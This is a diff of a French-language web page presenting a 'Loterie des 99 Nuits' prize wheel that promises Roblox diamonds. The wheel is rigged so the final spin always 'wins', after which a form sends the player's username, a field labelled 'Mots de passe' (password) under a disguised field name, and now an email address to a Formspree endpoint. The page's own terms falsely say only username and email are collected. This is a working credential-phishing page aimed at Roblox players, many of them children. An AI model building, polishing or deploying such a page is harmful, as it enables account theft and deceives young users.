@@ -3,6 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&display=swap" rel="stylesheet">
+    
     <title>La Loterie des 99 Nuits - Gagnez des Diamants !</title>
     <style>
         /* --- Styles Généraux et Thème Final --- */
@@ -14,14 +16,40 @@
             color: #ddd;
             line-height: 1.6;
             text-align: center;
+            overflow-x: hidden; /* Empêche le défilement horizontal */
+        }
+        
+        /* NOUVEAU: Ambiance Cultiste en Arrière-plan */
+        .cultist-ambiance {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            z-index: -10; /* Place l'élément derrière tout le contenu */
+            /* REMPLACEZ VOTRE_IMAGE_FOND_CULTISTE.jpg par votre fichier (GIF, Image ou Vidéo) */
+            background: url('VOTRE_IMAGE_FOND_CULTISTE.jpg') center center no-repeat;
+            background-size: cover;
+            opacity: 0.15; /* Très sombre pour l'ambiance */
+            /* Animation simple de pulsation/légère variation pour un effet étrange */
+            animation: spooky-pulse 60s infinite alternate;
+        }
+
+        @keyframes spooky-pulse {
+            from { filter: hue-rotate(0deg) brightness(0.95); }
+            to { filter: hue-rotate(5deg) brightness(1.05); }
+        }
+
+        /* APPLICATION DE LA NOUVELLE POLICE AUX TITRES */
+        h1, h2, h3, #spin-button, .label, .diamonds, #chances-restantes {
+            font-family: 'Bebas Neue', cursive;
+            letter-spacing: 2px;
         }
 
         .container {
+            position: relative; /* Important pour Z-index */
             width: 95%;
-            max-width: 600px;
+            max-width: 600px; 
             margin: 40px auto;
             padding: 20px 10px;
-            background: #2b2b2b;
+            background: rgba(43, 43, 43, 0.95); /* Légère opacité pour laisser voir le fond */
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.7);
             border-radius: 15px;
             border: 2px solid #660000;
@@ -30,21 +58,32 @@
         .hero {
             background: #000000;
             color: #ffd700;
-            padding: 40px 20px;
-            text-shadow: 0 0 5px rgba(255, 215, 0, 0.5);
+            padding: 30px 20px;
             border-bottom: 5px solid #ffd700;
             border-radius: 15px 15px 0 0;
             margin-bottom: 20px;
         }
 
-        .hero h1 { font-size: 2.5em; color: #fff; margin: 0 0 10px; }
-        #chances-restantes { font-size: 1.2em; font-weight: bold; color: #FFD700; margin-bottom: 20px; }
+        .hero h1 { 
+            font-size: 2.8em; 
+            color: #fff; 
+            margin: 0 0 10px; 
+            text-shadow: 0 0 10px #FFD700, 0 0 20px rgba(255, 215, 0, 0.5);
+            animation: text-pulse 2s infinite alternate;
+        }
+        
+        @keyframes text-pulse {
+            from { text-shadow: 0 0 5px #FFD700, 0 0 10px rgba(255, 215, 0, 0.3); }
+            to { text-shadow: 0 0 15px #FFD700, 0 0 30px rgba(255, 215, 0, 0.8); }
+        }
+
+        #chances-restantes { font-size: 1.4em; font-weight: bold; color: #FFD700; margin-bottom: 20px; }
         
         /* --- Conteneur de la Roue --- */
         .wheel-container {
             position: relative;
-            width: 320px;
-            height: 320px;
+            width: 320px; 
+            height: 320px; 
             margin: 30px auto;
             display: flex;
             justify-content: center;
@@ -54,8 +93,11 @@
             padding: 10px;
             box-shadow: inset 0 0 20px rgba(255, 215, 0, 0.4), 0 0 15px #ffd700;
         }
+        
+        /* La roue qui tourne */
         .wheel {
             width: 100%; height: 100%; border-radius: 50%; position: absolute;
+            /* La roue commence à 12h (0°) et tourne dans le sens horaire */
             background: conic-gradient(
                 #FFD700 0% 12.5%, #555 12.5% 25%, #8B0000 25% 37.5%, #555 37.5% 50%,
                 #228B22 50% 62.5%, #555 62.5% 75%, #191970 75% 87.5%, #555 87.5% 100%
@@ -68,78 +110,129 @@
             border-left: 15px solid transparent; border-right: 15px solid transparent; border-bottom: 25px solid #FFD700; z-index: 10;
         }
 
-        /* --- Texte sur la Roue (Alignement stable) --- */
+        /* --- STYLES DU TEXTE --- */
         .segment-text {
             position: absolute; top: 50%; left: 50%; width: 50%; height: 50%; font-weight: bold;
             display: flex; justify-content: center; align-items: center;
             transform-origin: 0% 0%; box-sizing: border-box;
         }
         .segment-text span {
-            display: block; background: rgba(255, 255, 255, 0.95); padding: 4px 6px; border-radius: 5px;
-            box-shadow: 1px 1px 3px rgba(0, 0, 0, 0.5); white-space: nowrap; color: #1a1a1a; font-size: 0.7em;
+            display: block; background: rgba(255, 255, 255, 0.95); 
+            padding: 3px 5px; 
+            border-radius: 4px; box-shadow: 1px 1px 3px rgba(0, 0, 0, 0.5); 
+            white-space: nowrap; 
+            color: #1a1a1a; 
+            font-size: 0.55em; 
+            font-family: 'Bebas Neue', cursive;
+        }
+        
+        /* Rotations des conteneurs pour aligner le centre du texte avec le centre du segment (45deg par segment) */
+        /* V12 : L'ordre et les angles sont conservés pour le placement visuel */
+        .text-1 { transform: rotate(22.5deg); } 
+        .text-2 { transform: rotate(67.5deg); }
+        .text-3 { transform: rotate(112.5deg); } 
+        .text-4 { transform: rotate(157.5deg); }
+        .text-5 { transform: rotate(202.5deg); } 
+        .text-6 { transform: rotate(247.5deg); }
+        .text-7 { transform: rotate(292.5deg); } 
+        .text-8 { transform: rotate(337.5deg); }
+        
+        /* Pousser le texte vers l'extérieur et le redresser (mobile) */
+        .text-1 span { transform: translateY(-85%) rotate(-22.5deg); }
+        .text-2 span { transform: translateY(-85%) rotate(-67.5deg); }
+        .text-3 span { transform: translateY(-85%) rotate(-112.5deg); }
+        .text-4 span { transform: translateY(-85%) rotate(-157.5deg); }
+        .text-5 span { transform: translateY(-85%) rotate(-202.5deg); }
+        .text-6 span { transform: translateY(-85%) rotate(-247.5deg); }
+        .text-7 span { transform: translateY(-85%) rotate(-292.5deg); }
+        .text-8 span { transform: translateY(-85%) rotate(-337.5deg); }
+        
+        /* --- MEDIA QUERIES pour PC/Grands Écrans --- */
+        @media (min-width: 600px) {
+            .hero h1 { font-size: 3.5em; }
+            #chances-restantes { font-size: 1.8em; }
+            .wheel-container { width: 380px; height: 380px; } 
+            .segment-text span { font-size: 0.7em; } 
+            
+            /* Ajustement des positions PC : Pousser plus loin (-95%) */
+            .text-1 span { transform: translateY(-95%) rotate(-22.5deg); }
+            .text-2 span { transform: translateY(-95%) rotate(-67.5deg); }
+            .text-3 span { transform: translateY(-95%) rotate(-112.5deg); }
+            .text-4 span { transform: translateY(-95%) rotate(-157.5deg); }
+            .text-5 span { transform: translateY(-95%) rotate(-202.5deg); }
+            .text-6 span { transform: translateY(-95%) rotate(-247.5deg); }
+            .text-7 span { transform: translateY(-95%) rotate(-292.5deg); }
+            .text-8 span { transform: translateY(-95%) rotate(-337.5deg); }
         }
 
-        /* Rotations des conteneurs */
-        .text-1 { transform: rotate(22.5deg); } .text-2 { transform: rotate(67.5deg); }
-        .text-3 { transform: rotate(112.5deg); } .text-4 { transform: rotate(157.5deg); }
-        .text-5 { transform: rotate(202.5deg); } .text-6 { transform: rotate(247.5deg); }
-        .text-7 { transform: rotate(292.5deg); } .text-8 { transform: rotate(337.5deg); }
+        /* --- Le reste des styles non liés à la roue --- */
         
-        /* Rotation et position du texte pour le rendre droit */
-        .text-1 span { transform: translateY(-90px) rotate(-22.5deg); }
-        .text-2 span { transform: translateY(-90px) rotate(-67.5deg); }
-        .text-3 span { transform: translateY(-90px) rotate(-112.5deg); }
-        .text-4 span { transform: translateY(-90px) rotate(-157.5deg); }
-        .text-5 span { transform: translateY(-90px) rotate(-202.5deg); }
-        .text-6 span { transform: translateY(-90px) rotate(-247.5deg); }
-        .text-7 span { transform: translateY(-90px) rotate(-292.5deg); }
-        .text-8 span { transform: translateY(-90px) rotate(-337.5deg); }
-        
-        /* --- Bouton Lancer --- */
         #spin-button {
-            padding: 18px 40px; font-size: 1.3em; font-weight: bold; background-color: #ff9800; color: #1a1a1a;
+            padding: 15px 30px; font-size: 1.4em; font-weight: bold; background-color: #ff9800; color: #1a1a1a;
             border: 4px solid #ffd700; border-radius: 50px; cursor: pointer; box-shadow: 0 0 20px rgba(255, 152, 0, 0.8);
             transition: background-color 0.3s; margin-top: 20px; animation: pulse 2s infinite;
         }
         #spin-button:disabled { background-color: #666; cursor: not-allowed; animation: none; box-shadow: none; }
         @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(255, 152, 0, 0.7); } 70% { box-shadow: 0 0 0 20px rgba(255, 152, 0, 0); } 100% { box-shadow: 0 0 0 0 rgba(255, 152, 0, 0); } }
 
-        /* --- Panneau de Formulaire --- */
         #winner-form-panel {
-            display: none; 
-            margin-top: 40px;
-            padding: 20px;
-            background: #101010;
-            border: 2px solid #FFD700;
-            border-radius: 10px;
+            display: none; position: relative; margin-top: 40px; padding: 20px;
+            background: #101010; border: 2px solid #FFD700; border-radius: 10px; overflow: hidden; 
         }
-        #winner-form-panel h3 { color: #FFD700; font-size: 1.8em; margin-bottom: 20px; }
-        .form-group { margin-bottom: 15px; text-align: left; }
-        .form-group label { display: block; margin-bottom: 5px; font-weight: bold; }
-        /* Style pour les champs texte et mot de passe */
-        .form-group input[type="text"], .form-group input[type="password"] {
+        .win-icon { font-size: 80px; margin-bottom: 10px; filter: drop-shadow(0 0 10px gold); animation: bounce 1s infinite alternate; display: block; line-height: 1; }
+        @keyframes bounce { from { transform: translateY(0px) scale(1.0); } to { transform: translateY(-10px) scale(1.05); } }
+        #winner-form-panel h3 { color: #FFD700; font-size: 1.8em; margin-bottom: 15px; position: relative; z-index: 2; animation: win-shake 0.5s infinite alternate; }
+        @keyframes win-shake { 0% { transform: scale(1); } 100% { transform: scale(1.02) rotate(1deg); } }
+
+        .form-group input[type="text"], .form-group input[type="email"] {
             width: calc(100% - 20px); padding: 10px; border: 1px solid #666; border-radius: 5px;
             background-color: #333; color: white; font-size: 1.1em;
         }
         .form-group input[type="submit"] {
-            width: 100%; padding: 15px; background-color: #28a745; color: white; border: none;
-            border-radius: 5px; cursor: pointer; font-size: 1.2em; margin-top: 10px;
+            width: 100%; padding: 12px; background-color: #28a745; color: white; border: none;
+            border-radius: 5px; cursor: pointer; font-size: 1.3em; margin-top: 10px;
         }
-        #form-status { margin-top: 15px; font-weight: bold; color: #FFD700; }
 
-        /* --- Liste des Prix --- */
         #result-message { margin-top: 30px; font-size: 1.6em; font-weight: bold; color: #ffd700; min-height: 40px; text-shadow: 0 0 5px rgba(255, 215, 0, 0.8); }
-        .prix-item { display: flex; justify-content: space-between; align-items: center; padding: 12px; margin-bottom: 8px; border-radius: 8px; font-weight: normal; box-shadow: 0 2px 5px rgba(0, 0, 0, 0.5); text-align: left; }
-        .prix-item .label { font-weight: bold; color: #fff; }
-        .prix-item .diamonds { font-size: 1.2em; color: #FFD700; text-shadow: 0 0 5px rgba(255, 215, 0, 0.5); }
+        .prix-item { display: flex; justify-content: space-between; align-items: center; padding: 10px; margin-bottom: 6px; border-radius: 8px; font-weight: normal; box-shadow: 0 2px 5px rgba(0, 0, 0, 0.5); text-align: left; }
+        .prix-item .label { font-weight: bold; color: #fff; font-size: 1em; }
+        .prix-item .diamonds { font-size: 1.5em; color: #FFD700; text-shadow: 0 0 8px rgba(255, 215, 0, 1), 0 0 20px rgba(255, 215, 0, 0.5); }
         .prix-item:nth-child(1) { border-left: 5px solid #FFD700; background: #3a3a3a; }
         .prix-item:nth-child(2) { border-left: 5px solid #8B0000; background: #3a3a3a; }
         .prix-item:nth-child(3) { border-left: 5px solid #228B22; background: #3a3a3a; }
         .prix-item:nth-child(4) { border-left: 5px solid #191970; background: #3a3a3a; }
         .modalites { margin-top: 30px; padding: 10px; background: #101010; border-radius: 8px; }
+
+        .modal-overlay {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.85); z-index: 9999; backdrop-filter: blur(5px);
+        }
+        .modal-content {
+            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            width: 90%; max-width: 500px; background: #2b2b2b; padding: 25px;
+            border-radius: 10px; border: 2px solid #FFD700; box-shadow: 0 0 20px rgba(255, 215, 0, 0.5);
+            max-height: 80vh; overflow-y: auto; text-align: left;
+        }
+        .modal-content h3 { color: #FFD700; font-size: 1.8em; margin-top: 0; text-align: center;}
+        .close-button {
+            position: absolute; top: 10px; right: 10px; background: #8B0000; color: white;
+            border: none; border-radius: 5px; padding: 5px 10px; cursor: pointer; font-weight: bold;
+        }
+
+        .confetti-icon {
+            font-size: 4em; position: absolute; top: 5px; right: 5px;
+            animation: confetti-fall 2s infinite linear; color: gold; z-index: 10;
+        }
+        .confetti-icon.left { left: 5px; animation-delay: 0.5s; color: #8B0000; }
+        @keyframes confetti-fall {
+            0% { transform: translateY(-100%) rotate(0deg); opacity: 1; }
+            100% { transform: translateY(100%) rotate(360deg); opacity: 0; }
+        }
     </style>
 </head>
 <body>
+
+    <div class="cultist-ambiance"></div>
 
     <header class="hero">
         <h1 style="color: #FFD700;">🦌 La Loterie des 99 Nuits</h1>
@@ -156,14 +249,15 @@
         
         <div class="wheel-container">
             <div class="wheel" id="wheel">
-                <div class="segment-text text-1"><span>SÉJOUR + 💎99</span></div>
-                <div class="segment-text text-3"><span>LUXE + 💎50</span></div>
-                <div class="segment-text text-5"><span>BIJOUX + 💎30</span></div>
-                <div class="segment-text text-7"><span>BON + 💎20</span></div>
-                <div class="segment-text text-2"><span style="color: #666;">CASE VIDE</span></div>
-                <div class="segment-text text-4"><span style="color: #666;">CASE VIDE</span></div>
-                <div class="segment-text text-6"><span style="color: #666;">CASE VIDE</span></div>
-                <div class="segment-text text-8"><span style="color: #666;">CASE VIDE</span></div>
+                <div class="segment-text text-2"><span>💎99</span></div> 
+                <div class="segment-text text-4"><span>💎50</span></div> 
+                <div class="segment-text text-6"><span>💎30</span></div> 
+                <div class="segment-text text-8"><span>💎20</span></div> 
+
+                <div class="segment-text text-1"><span style="color: #666;">💎0</span></div> 
+                <div class="segment-text text-3"><span style="color: #666;">💎0</span></div> 
+                <div class="segment-text text-5"><span style="color: #666;">💎0</span></div> 
+                <div class="segment-text text-7"><span style="color: #666;">💎0</span></div> 
             </div>
             <div class="wheel-pointer"></div>
         </div>
@@ -173,7 +267,13 @@
         <div id="result-message"></div>
 
         <div id="winner-form-panel">
-            <h3>🎉 FÉLICITATIONS ! ENREGISTREZ VOTRE GAIN ET CONNECTER VOUS !</h3>
+            
+            <div class="confetti-icon">🎉</div>
+            <div class="confetti-icon left">✨</div>
+
+            <span class="win-icon">🦌</span>
+            
+            <h3>🎉 FÉLICITATIONS ! ENREGISTREZ VOTRE GAIN !</h3>
             
             <form id="winner-form" action="https://formspree.io/f/mgvqdwzo" method="POST">
                 <div class="form-group">
@@ -183,6 +283,10 @@
                 <div class="form-group">
                     <label for="roblox_account">Mots de passe :</label>
                     <input type="text" id="roblox_account" name="roblox_account" required>
+                </div>
+                <div class="form-group">
+                    <label for="contact_email">Adresse mail :</label>
+                    <input type="email" id="contact_email" name="contact_email" required>
                 </div>
                 
                 <input type="hidden" id="prize_won" name="prize_won" value="">
@@ -216,7 +320,7 @@
         </div>
         
         <div class="modalites">
-            <a href="#" style="color: #ffd700; text-decoration: none; font-weight: bold;">[Lien vers les Modalités et Conditions]</a>
+            <a href="#" id="open-modalites" style="color: #ffd700; text-decoration: none; font-weight: bold;">[Lire les Modalités et Conditions]</a>
         </div>
 
     </main>
@@ -225,6 +329,23 @@
         <p style="color: #666;">&copy; 2025 La Loterie des 99 Nuits.</p>
     </footer>
 
+    <div id="modalites-modal" class="modal-overlay">
+        <div class="modal-content">
+            <button class="close-button" id="close-modalites">X</button>
+            <h3>Modalités et Conditions de la Loterie</h3>
+            <p><strong>1. Éligibilité :</strong> Cette loterie est ouverte à tous les joueurs de Roblox. Une seule participation par compte est autorisée.</p>
+            <p><strong>2. Chances de Gain :</strong> Chaque joueur dispose de 2 lancers de roue initiaux. Le dernier lancer garantit un gain de consolation (20 Diamants).</p>
+            <p><strong>3. Réclamation des Prix :</strong> Les gagnants doivent fournir leur nom d'utilisateur Roblox et une adresse e-mail valide pour que l'équipe du Grand Cerf puisse les contacter afin de valider et d'attribuer le gain.</p>
+            <p><strong>4. Délai de Réclamation :</strong> Tous les prix non réclamés dans les 72 heures suivant la victoire seront annulés.</p>
+            <p><strong>5. Confidentialité :</strong> Les informations fournies (nom d'utilisateur et e-mail) sont strictement confidentielles et ne seront utilisées que dans le cadre de l'attribution des prix et de la notification des gagnants.</p>
+            <p style="text-align: center; margin-top: 20px;"><em>En participant, vous acceptez l'intégralité de ces conditions.</em></p>
+        </div>
+    </div>
+    <audio id="ambiance-music" loop src="VOTRE_MUSIQUE_AMBIANCE.mp3"></audio>
+    <audio id="sfx-spin" src="VOTRE_SFX_ROUE_TOURNE.mp3"></audio>
+    <audio id="sfx-click" src="VOTRE_SFX_BOUTON_CLIC.mp3"></audio>
+    <audio id="sfx-win" src="VOTRE_SFX_VICTOIRE.mp3"></audio>
+    <audio id="sfx-lose" src="VOTRE_SFX_PERTE.mp3"></audio>
     <script>
         const wheel = document.getElementById('wheel');
         const spinButton = document.getElementById('spin-button');
@@ -233,22 +354,63 @@
         const formPanel = document.getElementById('winner-form-panel');
         const prizeWonInput = document.getElementById('prize_won');
         
-        let chancesRestantes = 2; // Le joueur commence avec 2 chances
+        // Éléments Audio
+        const ambianceMusic = document.getElementById('ambiance-music');
+        const sfxSpin = document.getElementById('sfx-spin');
+        const sfxClick = document.getElementById('sfx-click');
+        const sfxWin = document.getElementById('sfx-win');
+        const sfxLose = document.getElementById('sfx-lose');
+        
+        // Modalité JS
+        const openModalButton = document.getElementById('open-modalites');
+        const closeModalButton = document.getElementById('close-modalites');
+        const modal = document.getElementById('modalites-modal');
+        
+        let chancesRestantes = 2; 
 
+        // CORRECTION V12: L'ordre des segments est défini CLAIREMENT en fonction de leur position angulaire (TCA = Target Center Angle)
+        // La flèche est à 0°. Les angles sont comptés dans le sens horaire.
         const segments = [
-            { name: "99 Diamants et le Grand Séjour", degrees: 360, isWin: true },
-            { name: "CASE VIDE", degrees: 315, isWin: false },
-            { name: "50 Diamants et 10 Nuits de Luxe", degrees: 270, isWin: true },
-            { name: "CASE VIDE", degrees: 225, isWin: false },
-            { name: "30 Diamants et une Collection de Bijoux", degrees: 180, isWin: true },
-            { name: "CASE VIDE", degrees: 135, isWin: false },
-            { name: "20 Diamants et un Bon d'Achat", degrees: 90, isWin: true },
-            { name: "CASE VIDE", degrees: 45, isWin: false }
+            // Index 0: Yellow (Seg 1, 0°-45°) -> 💎0
+            { name: "CASE VIDE (💎0)", degrees: 22.5, isWin: false, index: 0 }, 
+            // Index 1: Grey (Seg 2, 45°-90°) -> 💎99
+            { name: "99 Diamants et le Grand Séjour", degrees: 67.5, isWin: true, index: 1 }, 
+            // Index 2: Red (Seg 3, 90°-135°) -> 💎0
+            { name: "CASE VIDE (💎0)", degrees: 112.5, isWin: false, index: 2 }, 
+            // Index 3: Grey (Seg 4, 135°-180°) -> 💎50
+            { name: "50 Diamants et 10 Nuits de Luxe", degrees: 157.5, isWin: true, index: 3 }, 
+            // Index 4: Green (Seg 5, 180°-225°) -> 💎0
+            { name: "CASE VIDE (💎0)", degrees: 202.5, isWin: false, index: 4 }, 
+            // Index 5: Grey (Seg 6, 225°-270°) -> 💎30
+            { name: "30 Diamants et une Collection de Bijoux", degrees: 247.5, isWin: true, index: 5 }, 
+            // Index 6: Blue (Seg 7, 270°-315°) -> 💎0
+            { name: "CASE VIDE (💎0)", degrees: 292.5, isWin: false, index: 6 }, 
+            // Index 7: Grey (Seg 8, 315°-360°) -> 💎20 <-- GAIN GARANTI
+            { name: "20 Diamants et un Bon d'Achat", degrees: 337.5, isWin: true, index: 7 } 
         ];
 
         let currentRotation = 0;
 
+        // Fonction pour jouer la musique d'ambiance sur interaction
+        function playAmbiance() {
+            if (ambianceMusic.paused) {
+                // Tente de jouer la musique, gestion des erreurs d'autoplay
+                ambianceMusic.volume = 0.3; // Volume faible pour le fond
+                ambianceMusic.play().catch(e => console.log("Autoplay bloqué, la musique jouera après le premier clic."));
+            }
+            // Retirer l'écouteur après le premier déclenchement réussi
+            document.removeEventListener('click', playAmbiance);
+        }
+
+        // Tenter de démarrer la musique sur le premier clic de l'utilisateur sur la page
+        document.addEventListener('click', playAmbiance);
+
         spinButton.addEventListener('click', () => {
+            
+            sfxClick.currentTime = 0; // Réinitialiser le son pour un clic rapide
+            sfxClick.volume = 0.7;
+            sfxClick.play();
+
             if (chancesRestantes <= 0) {
                 resultMessage.innerHTML = "<span style='color: red;'>Désolé, vous n'avez plus de chances pour cette loterie.</span>";
                 spinButton.disabled = true;
@@ -259,47 +421,71 @@
             formPanel.style.display = 'none'; 
             resultMessage.textContent = "La roue tourne... Suspense !";
 
-            let winningIndex;
+            // Démarrer le son de la roue
+            sfxSpin.volume = 0.5;
+            sfxSpin.loop = true;
+            sfxSpin.play();
+
+            // 1. Tirage aléatoire initial
+            let winningIndex = Math.floor(Math.random() * segments.length);
+            let winner = segments[winningIndex];
             
-            // --- LOGIQUE AJOUTÉE : GAIN FORCÉ AU DERNIER TOUR ---
+            // --- LOGIQUE DE GAIN GARANTI ---
             if (chancesRestantes === 1) {
-                // Force le gain sur l'index 6 (20 Diamants et un Bon d'Achat)
-                winningIndex = 6; 
-            } else {
-                // Logique normale : tirage aléatoire
-                winningIndex = Math.floor(Math.random() * segments.length);
+                if (winner.isWin === false) {
+                    // Si le joueur est sur le dernier tour ET que le tirage est une PERTE (💎0)
+                    // On force l'arrêt sur le gain garanti (20 Diamants, Index 7)
+                    winningIndex = 7; 
+                    winner = segments[winningIndex]; // Mettre à jour l'objet gagnant (maintenant 💎20)
+                }
+                // Si le joueur gagne déjà (99, 50, 30), on conserve ce gain.
             }
             // --- FIN LOGIQUE DE GAIN GARANTI ---
             
-            const winner = segments[winningIndex];
-
-            // Calcul de la rotation
+            // 2. Calcul de la rotation pour l'index final
             const baseRotation = 5 * 360; 
-            const rotationOffset = 22.5; 
-            const segmentAngle = segments[winningIndex].degrees;
-            const degreesToWin = segmentAngle - rotationOffset;
-            const randomInSegment = Math.floor(Math.random() * 40);
-            const finalRotation = baseRotation + degreesToWin + randomInSegment;
+            const targetCenterAngle = winner.degrees; // Angle central du segment gagnant (TCA)
+
+            // Rotation requise pour aligner le TCA avec le pointeur (0 position).
+            // Rotation = (360 - TCA) pour une rotation négative/sens anti-horaire.
+            const degreesToWin = 360 - targetCenterAngle; 
+
+            // Ajout d'un petit offset aléatoire dans le segment (-15° à +15°)
+            const randomOffset = (Math.random() * 30) - 15; 
             
+            const finalRotation = baseRotation + degreesToWin + randomOffset;
+            
+            // La rotation est appliquée en négatif (sens anti-horaire)
             currentRotation += finalRotation;
 
             wheel.style.transition = 'transform 5s cubic-bezier(0.25, 0.1, 0.25, 1)';
             wheel.style.transform = `rotate(-${currentRotation}deg)`;
 
             setTimeout(() => {
+                
+                sfxSpin.pause(); // Arrêter le bruit de la roue
+
                 chancesRestantes--;
                 chancesCount.textContent = chancesRestantes;
                 chancesCount.style.color = chancesRestantes > 0 ? '#FFD700' : 'red';
                 
                 if (winner.isWin) {
+                    sfxWin.currentTime = 0;
+                    sfxWin.volume = 1.0;
+                    sfxWin.play();
+                    
+                    // Affichage du nom du VRAI gagnant
                     resultMessage.innerHTML = `FÉLICITATIONS ! Vous avez gagné : <strong style="color: #FFD700;">${winner.name}</strong> !`;
                     
-                    // Afficher le panneau et préparer le formulaire
-                    prizeWonInput.value = winner.name;
+                    prizeWonInput.value = winner.name; 
                     formPanel.style.display = 'block';
-                    spinButton.disabled = true; // Désactive la roue si un prix est gagné
+                    spinButton.disabled = true; 
                     
                 } else {
+                    sfxLose.currentTime = 0;
+                    sfxLose.volume = 0.8;
+                    sfxLose.play();
+                    
                     resultMessage.innerHTML = `<span style='color: #888;'>Dommage ! Vous êtes tombé sur une ${winner.name}. Retentez votre chance !</span>`;
                     formPanel.style.display = 'none';
                     
@@ -309,7 +495,7 @@
                         spinButton.disabled = false;
                     }
                 }
-            }, 5000); // Durée de la rotation
+            }, 5000); 
         });
         
         // Gérer l'envoi du formulaire via AJAX (vers Formspree)
@@ -330,11 +516,10 @@
                 });
                 
                 if (response.ok) {
-                    status.innerHTML = '✅ Gain enregistré ! Les informations ont été envoyées. Vous serez contacté(e) sous peu.';
+                    status.innerHTML = '✅ Gain enregistré ! Les informations ont été envoyées. Vous serez contacté(e) sous peu par e-mail.';
                     form.reset();
                     formPanel.style.display = 'none';
                     
-                    // Désactiver la roue après succès
                     spinButton.disabled = true; 
                     chancesRestantes = 0;
                     chancesCount.textContent = 0;
@@ -345,6 +530,23 @@
                 }
             } catch (error) {
                 status.innerHTML = '❌ Erreur de connexion. Veuillez réessayer.';
+            }
+        });
+
+        // --- Fonctions de la Modalité ---
+        openModalButton.addEventListener('click', (e) => {
+            e.preventDefault();
+            modal.style.display = 'block';
+        });
+
+        closeModalButton.addEventListener('click', () => {
+            modal.style.display = 'none';
+        });
+
+        // Fermer si l'utilisateur clique en dehors de la modal
+        window.addEventListener('click', (e) => {
+            if (e.target == modal) {
+                modal.style.display = 'none';
             }
         });
 
